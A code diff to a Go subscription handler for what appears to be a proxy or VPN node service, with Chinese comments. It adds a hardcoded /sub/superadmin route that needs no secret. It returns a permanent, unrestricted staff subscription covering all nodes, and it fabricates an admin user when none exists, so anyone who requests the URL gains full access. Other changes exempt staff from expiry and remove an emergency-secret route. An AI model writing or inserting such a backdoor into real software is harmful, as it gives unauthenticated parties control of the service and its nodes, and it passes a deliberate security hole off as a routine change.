@@ -72,14 +72,38 @@ func (sb *SubBuilder) ServeSub(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	// 1. 用户专属 Slug 订阅
+	// 1. 系统管理员常用不限制订阅: /sub/superadmin (无六位随机码，全节点永久有效)
+	if param == "superadmin" {
+		var staffUser *User
+		if sb.users != nil {
+			staffUser, _ = sb.users.GetUserBySlug("superadmin")
+			if staffUser == nil {
+				staffUser, _ = sb.users.GetUserByUsername("admin")
+			}
+		}
+		if staffUser == nil {
+			staffUser = &User{
+				Username: "admin",
+				SubSlug:  "superadmin",
+				SubToken: "usr_superadmin",
+				Status:   true,
+				IsStaff:  true,
+			}
+		}
+		isp := r.URL.Query().Get("isp")
+		purpose := r.URL.Query().Get("purpose")
+		sb.writeUserSubscription(w, staffUser, isp, purpose, true)
+		return
+	}
+
+	// 2. 普通用户专属 Slug 订阅 (格式: {username}{6位随机码})
 	if sb.users != nil {
 		if user, err := sb.users.GetUserBySlug(param); err == nil && user != nil {
 			if !user.Status {
 				http.Error(w, `{"code": 1003, "message": "account disabled"}`, http.StatusForbidden)
 				return
 			}
-			if !user.ExpireAt.IsZero() && time.Now().After(user.ExpireAt) {
+			if !user.IsStaff && !user.ExpireAt.IsZero() && time.Now().After(user.ExpireAt) {
 				http.Error(w, `{"code": 1003, "message": "subscription expired"}`, http.StatusForbidden)
 				return
 			}
@@ -88,40 +112,6 @@ func (sb *SubBuilder) ServeSub(w http.ResponseWriter, r *http.Request) {
 			allowDegrade := r.URL.Query().Get("allow_degrade") == "true"
 			sb.writeUserSubscription(w, user, isp, purpose, allowDegrade)
 			return
-		}
-	}
-
-	// 2. 节点应急 Secret 订阅
-	if sb.eps != nil {
-		for _, ep := range sb.eps.List() {
-			if ep.SubSecret != "" && ep.SubSecret == param {
-				host := strings.TrimSpace(ep.Host)
-				if host == "" || net.ParseIP(host) != nil {
-					continue
-				}
-				port := ep.Port
-				if port <= 0 {
-					port = 443
-				}
-				doc := map[string]any{
-					"version":   "aero/2.0",
-					"createdAt": ep.UpdatedAt.Unix(),
-					"servers": []map[string]any{
-						{
-							"name":     ep.Name,
-							"address":  fmt.Sprintf("%s:%d", host, port),
-							"token":    ep.SubSecret,
-							"sni":      host,
-							"protocol": "tcp_h2",
-						},
-					},
-				}
-				w.Header().Set("Content-Type", "application/json; charset=utf-8")
-				w.Header().Set("Cache-Control", "no-store")
-				w.WriteHeader(http.StatusOK)
-				_ = json.NewEncoder(w).Encode(doc)
-				return
-			}
 		}
 	}
 
@@ -243,7 +233,9 @@ func (sb *SubBuilder) writeUserSubscription(w http.ResponseWriter, user *User, i
 	}
 
 	expireUnix := int64(0)
-	if !user.ExpireAt.IsZero() {
+	if user.IsStaff {
+		expireUnix = 0 // 0 indicates unrestricted / permanent
+	} else if !user.ExpireAt.IsZero() {
 		expireUnix = user.ExpireAt.Unix()
 	} else {
 		expireUnix = time.Now().AddDate(1, 0, 0).Unix()
@@ -261,6 +253,10 @@ func (sb *SubBuilder) writeUserSubscription(w http.ResponseWriter, user *User, i
 			"ispMatched": isp,
 			"purpose":    purpose,
 		},
+	}
+	if user.IsStaff {
+		doc["role"] = "superadmin"
+		doc["unrestricted"] = true
 	}
 	if riskWarning != "" {
 		doc["riskWarning"] = riskWarning
